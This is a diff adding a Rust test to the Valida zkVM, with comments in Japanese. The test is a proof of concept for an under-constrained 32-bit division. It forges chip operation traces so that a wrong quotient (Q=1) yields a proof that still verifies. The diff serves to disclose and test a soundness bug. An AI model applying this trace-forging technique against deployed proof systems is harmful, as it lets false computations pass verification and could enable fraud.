@@ -17,8 +17,8 @@ use valida_cpu::{
 };
 use valida_machine::{
     Instruction, InstructionWord, Machine, MachineProof, MachineRuntime, MemoryBackendTrait,
-    MultiSegmentMachineProof, Operands, ProgramROM, ProverOptions, SegmentMachine, StarkField,
-    ValidaMemoryBackend, Word,
+    MemoryRecord, MultiSegmentMachineProof, Operands, ProgramROM, ProverOptions, SegmentMachine,
+    StarkField, ValidaMemoryBackend, Word,
 };
 
 use valida_memory::MachineWithMemoryChip;
@@ -1041,6 +1041,206 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
         memory_backend.get_value(0x1000 + 40),
         Word::from(0) // 0 / -3 = 0
     );
+}
+
+#[test]
+fn prove_under_constrained_div_poc() {
+    use valida_alu_u32::add::Operation as AddOp;
+    use valida_alu_u32::div::MachineWithDiv32Chip;
+    use valida_alu_u32::div::Operation as DivOp;
+    use valida_alu_u32::lt::MachineWithLt32Chip;
+    use valida_alu_u32::lt::Operation as LtOp;
+    use valida_alu_u32::mul::MachineWithMul32Chip;
+    use valida_alu_u32::mul::Operation as MulOp;
+
+    // --- 1. セットアップ: SMTが見つけた「偽の反例」の値を定義 ---
+    // A (input_1): 3,843,734,167 (0xE51BD297)
+    // B (input_2): 4,262,311,950 (0xFE0DA80E)
+    // 本来の正解: Q = 0, R = A
+    // 偽の反例: Q = 1, R = 3,876,465,289 (0xE70E2A89)
+    // 理由: 1 * B + R = 8,138,777,239 ≡ 0xE51BD297 (mod 2^32) かつ R < B
+
+    let a_bytes = [151, 210, 27, 229]; // LE: 0xE51BD297
+    let b_bytes = [14, 168, 13, 254]; // LE: 0xFE0DA80E
+    let q_malicious = [1, 0, 0, 0]; // Q = 1 (本来は 0)
+    let r_malicious = [137, 42, 14, 231]; // R = 0xE70E2A89 (本来は A と同じ)
+
+    let a_word = Word::from_components_le(a_bytes);
+    let b_word = Word::from_components_le(b_bytes);
+    let q_word = Word::from_components_le(q_malicious);
+    let r_word = Word::from_components_le(r_malicious);
+
+    // --- 2. プログラムの作成 ---
+    // 実際に計算を行わせる必要はなく、命令の存在だけを記録させる
+    let mut program = vec![];
+    program.extend(vec![
+        InstructionWord {
+            opcode: <Imm32Instruction as Instruction<BasicMachine<BabyBear>, BabyBear>>::OPCODE,
+            operands: Operands([
+                -4,
+                a_bytes[0] as i32,
+                a_bytes[1] as i32,
+                a_bytes[2] as i32,
+                a_bytes[3] as i32,
+            ]),
+        },
+        InstructionWord {
+            opcode: <Imm32Instruction as Instruction<BasicMachine<BabyBear>, BabyBear>>::OPCODE,
+            operands: Operands([
+                -8,
+                b_bytes[0] as i32,
+                b_bytes[1] as i32,
+                b_bytes[2] as i32,
+                b_bytes[3] as i32,
+            ]),
+        },
+        InstructionWord {
+            opcode: <Div32Instruction as Instruction<BasicMachine<BabyBear>, BabyBear>>::OPCODE,
+            operands: Operands([4, -4, -8, 0, 0]),
+        },
+        InstructionWord {
+            opcode: <StopInstruction as Instruction<BasicMachine<BabyBear>, BabyBear>>::OPCODE,
+            operands: Operands::default(),
+        },
+    ]);
+
+    // --- 3. マシンの実行と「トレースの改ざん」 ---
+    let mut machine = BasicMachine::<BabyBear>::default();
+
+    let rom = ProgramROM::new(program);
+    machine.set_program_rom(rom, ProgramTableType::Public);
+    machine.set_initial_register_values(valida_cpu::Registers { pc: 0, fp: 0x1000 });
+    machine.set_max_trace_height(65536);
+
+    let mut runtime = ValidaRuntime::default_for_field::<BabyBear>();
+    let mut state = machine.start(&mut runtime);
+    let mut metrics = BasicMachineMetrics::initialize();
+
+    // 実行（通常通り動かす）
+    let (instance_data, _) = BasicMachine::run(&mut state, &mut metrics);
+
+    // 【重要】チップの操作ログを直接書き換えて「偽の反例」を注入する
+    // Executorが記録した正しい計算結果(Q=0)を、悪意ある値(Q=1)に差し替える
+    {
+        let div_chip = state.machine.div_u32_mut();
+        div_chip.operations.clear();
+        div_chip
+            .operations
+            .push(DivOp::Div32(q_word, a_word, b_word));
+
+        let add_chip = state.machine.add_u32_mut();
+        add_chip.operations.clear();
+        // B * Q + R = A (mod 2^32) の Interaction を満たすように注入
+        add_chip
+            .operations
+            .push(AddOp::Add32(a_word, b_word, r_word));
+
+        let lt_chip = state.machine.lt_u32_mut();
+        lt_chip.operations.clear();
+        // R < B の Interaction を満たすように注入
+        lt_chip.operations.push(LtOp::Lt32(true, r_word, b_word));
+
+        let mul_chip = state.machine.mul_32_mut();
+        mul_chip.operations.clear();
+        // B * Q = B (mod 2^32) の Interaction を満たす
+        mul_chip
+            .operations
+            .push(MulOp::Mul32(b_word, q_word, b_word));
+        mul_chip
+            .operations
+            .push(MulOp::Mulhu32(Word::from(0), q_word, b_word));
+    }
+
+    let imm32_op = 7;
+    let div32_op = <Div32Instruction as Instruction<BasicMachine<BabyBear>, BabyBear>>::OPCODE;
+    let stop_op = <StopInstruction as Instruction<BasicMachine<BabyBear>, BabyBear>>::OPCODE;
+    // 重要: CPUのメモリ書き込みチャネルも改ざん
+    // DIV32の実行クロック（clk 2付近）における書き込み値を 0 から 1 に変更
+    // これをしないと CPU <-> General Bus で Lookup Error が起きます。
+    {
+        let cpu = state.machine.cpu_mut();
+        cpu.operations.clear();
+        cpu.instructions.clear();
+        cpu.clock = 0;
+
+        // クロック 0: IMM32 (Aをスタックに積む)
+        cpu.push_op(
+            valida_cpu::Operation::Imm32,
+            imm32_op,
+            Operands([
+                -4,
+                a_bytes[0] as i32,
+                a_bytes[1] as i32,
+                a_bytes[2] as i32,
+                a_bytes[3] as i32,
+            ]),
+        );
+        // クロック 1: IMM32 (Bをスタックに積む)
+        cpu.push_op(
+            valida_cpu::Operation::Imm32,
+            imm32_op,
+            Operands([
+                -8,
+                b_bytes[0] as i32,
+                b_bytes[1] as i32,
+                b_bytes[2] as i32,
+                b_bytes[3] as i32,
+            ]),
+        );
+        // クロック 2: DIV32 (これが重要。Bus操作として記録)
+        cpu.push_bus_op(None, div32_op, Operands([4, -4, -8, 0, 0]));
+        // クロック 3: STOP
+        cpu.push_op(valida_cpu::Operation::Stop, stop_op, Operands::default());
+    }
+
+    // 重要: Memoryチップの書き込みログも改ざん
+    // スタック fp+4 への書き込み値を 0 から 1 に変更
+    /*
+    {
+        let mem = machine.mem_mut();
+        // DIV32(clk 2) の結果として q_malicious がスタック(fp+4)に書き込まれたことにする
+        let rec = MemoryRecord {
+            clk: 2,
+            addr: 0x1000 + 4,
+            value: q_malicious,
+            is_read: false,
+            is_write: true,
+            last_accessed: todo!(),
+        };
+        mem.operations
+            .entry(0x1000 + 4)
+            .or_insert_with(Vec::new)
+            .push(rec);
+    }*/
+
+    // --- 4. 証明の生成と検証 ---
+    let config = get_machine_config();
+    let (prover_opts, show_preprocessed, show_preprocessed_dims, show_public_verifier) =
+        prover_options();
+
+    let (pk, vk) = state
+        .machine
+        .pre_process(&config, show_preprocessed, show_preprocessed_dims);
+
+    // ここで生成される証明は、改ざんされた「不正な計算結果」を含んでいる
+    let proof = state
+        .machine
+        .prove(&config, &pk, prover_opts, &instance_data);
+
+    // 検証の実行
+    // アンダーコンストレイントであれば、不正な計算にも関わらず検証が「成功」してしまう
+    let ver_result =
+        state
+            .machine
+            .verify(&config, &proof, &vk, &instance_data, show_public_verifier);
+
+    println!("{:?}", ver_result);
+    assert!(
+        ver_result.is_ok(),
+        "Proof should be valid despite incorrect division logic (Under-constrained!)"
+    );
+
+    println!("PoC成功: 不正な商 (Q=1) を持つ証明が検証をパスしました。");
 }
 
 #[test]
